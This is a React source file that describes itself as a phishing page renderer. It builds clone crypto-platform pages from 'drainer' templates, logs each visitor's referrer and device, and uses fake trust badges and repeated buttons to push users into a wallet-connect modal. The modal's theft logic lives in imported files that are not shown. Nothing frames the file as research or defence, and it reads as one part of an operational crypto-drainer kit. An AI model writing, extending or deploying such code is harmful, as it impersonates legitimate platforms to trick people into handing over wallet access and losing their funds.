/**
 * TemplatePage - Dynamic phishing page renderer
 * URL: /p/:templateId
 * Shows a crypto platform clone page with wallet connect
 */
import { useState, useEffect } from "react";
import { useParams } from "wouter";
import { getTemplateById, DRAINER_TEMPLATES } from "@/lib/templates";
import WalletConnectDirect from "@/components/WalletConnectDirect";
import { trpc } from "@/lib/trpc";

export default function TemplatePage() {
  const params = useParams<{ templateId: string }>();
  const templateId = params.templateId;
  const template = getTemplateById(templateId ?? "");
  const [showConnect, setShowConnect] = useState(false);
  const trackVisit = trpc.drainer.trackVisit.useMutation();

  useEffect(() => {
    // Auto-open connect if ?action=connect
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get("action") === "connect") {
      setShowConnect(true);
    }
    // Track visit
    trackVisit.mutate({
      page: templateId ?? "unknown",
      ref: urlParams.get("ref") ?? "direct",
      device: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "mobile" : "desktop",
    });
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  if (!template) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-black text-white">
        <div className="text-center">
          <p className="text-2xl font-bold mb-2">Template not found</p>
          <p className="text-muted-foreground">Template ID: {templateId}</p>
          <p className="text-sm mt-4 text-muted-foreground">Available: {DRAINER_TEMPLATES.map(t => t.id).join(", ")}</p>
        </div>
      </div>
    );
  }

  const isDark = template.theme === "dark";
  const textColor = isDark ? "#FFFFFF" : "#0A0A0A";
  const mutedColor = isDark ? "rgba(255,255,255,0.5)" : "rgba(0,0,0,0.5)";
  const cardBg = isDark ? "rgba(255,255,255,0.05)" : "rgba(0,0,0,0.04)";
  const borderColor = isDark ? "rgba(255,255,255,0.1)" : "rgba(0,0,0,0.1)";

  return (
    <div className="min-h-screen" style={{ background: template.bgColor, color: textColor, fontFamily: "system-ui, -apple-system, sans-serif" }}>
      {/* Navbar */}
      <nav style={{ borderBottom: `1px solid ${borderColor}`, background: isDark ? "rgba(0,0,0,0.8)" : "rgba(255,255,255,0.95)" }}
        className="sticky top-0 z-40 backdrop-blur-lg">
        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="text-2xl">{template.logo}</span>
            <span className="font-bold text-lg" style={{ color: template.primaryColor }}>{template.logoText}</span>
          </div>
          <div className="hidden md:flex items-center gap-6 text-sm" style={{ color: mutedColor }}>
            <a href="#" className="hover:opacity-80">Markets</a>
            <a href="#" className="hover:opacity-80">Trade</a>
            <a href="#" className="hover:opacity-80">Earn</a>
            <a href="#" className="hover:opacity-80">NFT</a>
          </div>
          <button
            onClick={() => setShowConnect(true)}
            className="px-4 py-2 rounded-lg text-sm font-semibold transition-all hover:opacity-90 active:scale-95"
            style={{ background: template.primaryColor, color: isDark ? "#000" : "#fff" }}>
            {template.ctaText}
          </button>
        </div>
      </nav>

      {/* Hero */}
      <div className="max-w-6xl mx-auto px-4 pt-20 pb-16">
        <div className="grid md:grid-cols-2 gap-12 items-center">
          <div className="space-y-6">
            {/* Trust badges */}
            <div className="flex flex-wrap gap-2">
              {template.trustBadges.map(badge => (
                <span key={badge} className="text-xs px-3 py-1 rounded-full font-medium"
                  style={{ background: `${template.primaryColor}20`, color: template.primaryColor, border: `1px solid ${template.primaryColor}40` }}>
                  ✓ {badge}
                </span>
              ))}
            </div>

            <h1 className="text-4xl md:text-5xl font-black leading-tight" style={{ color: textColor }}>
              {template.headline}
            </h1>
            <p className="text-lg" style={{ color: mutedColor }}>
              {template.subheadline}
            </p>

            {/* Features */}
            <ul className="space-y-2">
              {template.features.map(f => (
                <li key={f} className="flex items-center gap-2 text-sm" style={{ color: mutedColor }}>
                  <span style={{ color: template.primaryColor }}>✓</span>
                  {f}
                </li>
              ))}
            </ul>

            {/* CTA Buttons */}
            <div className="flex flex-wrap gap-3 pt-2">
              <button
                onClick={() => setShowConnect(true)}
                className="px-8 py-4 rounded-xl font-bold text-base transition-all hover:opacity-90 active:scale-95 shadow-lg"
                style={{ background: template.primaryColor, color: isDark ? "#000" : "#fff", boxShadow: `0 8px 32px ${template.primaryColor}40` }}>
                {template.ctaText}
              </button>
              <button
                className="px-8 py-4 rounded-xl font-bold text-base transition-all hover:opacity-80"
                style={{ background: cardBg, color: textColor, border: `1px solid ${borderColor}` }}>
                Learn More
              </button>
            </div>
          </div>

          {/* Stats card */}
          <div className="rounded-2xl p-8 space-y-6"
            style={{ background: cardBg, border: `1px solid ${borderColor}`, backdropFilter: "blur(20px)" }}>
            <div className="text-center mb-4">
              <span className="text-6xl">{template.logo}</span>
              <p className="text-sm mt-2 font-semibold" style={{ color: template.primaryColor }}>{template.logoText} Platform</p>
            </div>

            <div className="grid grid-cols-3 gap-4">
              {template.stats.map(stat => (
                <div key={stat.label} className="text-center p-3 rounded-xl" style={{ background: `${template.primaryColor}10` }}>
                  <p className="text-xl font-black" style={{ color: template.primaryColor }}>{stat.value}</p>
                  <p className="text-xs mt-1" style={{ color: mutedColor }}>{stat.label}</p>
                </div>
              ))}
            </div>

            <button
              onClick={() => setShowConnect(true)}
              className="w-full py-4 rounded-xl font-bold text-base transition-all hover:opacity-90 active:scale-95"
              style={{ background: `linear-gradient(135deg, ${template.primaryColor}, ${template.secondaryColor === "#FFFFFF" ? template.primaryColor + "99" : template.secondaryColor})`, color: isDark ? "#000" : "#fff" }}>
              🔗 {template.ctaText}
            </button>

            <p className="text-center text-xs" style={{ color: mutedColor }}>
              By connecting, you agree to our Terms of Service and Privacy Policy
            </p>
          </div>
        </div>
      </div>

      {/* Bottom section */}
      <div style={{ borderTop: `1px solid ${borderColor}` }} className="py-12">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8">
            {["Security", "Products", "Support", "Company"].map(section => (
              <div key={section}>
                <p className="font-semibold text-sm mb-3" style={{ color: textColor }}>{section}</p>
                {["Overview", "Documentation", "Blog", "Contact"].map(link => (
                  <a key={link} href="#" className="block text-xs py-1 hover:opacity-80" style={{ color: mutedColor }}>{link}</a>
                ))}
              </div>
            ))}
          </div>
          <div className="mt-8 pt-6 flex items-center justify-between" style={{ borderTop: `1px solid ${borderColor}` }}>
            <div className="flex items-center gap-2">
              <span>{template.logo}</span>
              <span className="text-sm font-bold" style={{ color: template.primaryColor }}>{template.logoText}</span>
            </div>
            <p className="text-xs" style={{ color: mutedColor }}>© 2024 {template.logoText}. All rights reserved.</p>
          </div>
        </div>
      </div>

      {/* Wallet Connect Modal */}
      {showConnect && (
        <WalletConnectDirect
          onClose={() => setShowConnect(false)}
          autoOpen={/Mobi|Android|iPhone/i.test(navigator.userAgent)}
        />
      )}
    </div>
  );
}
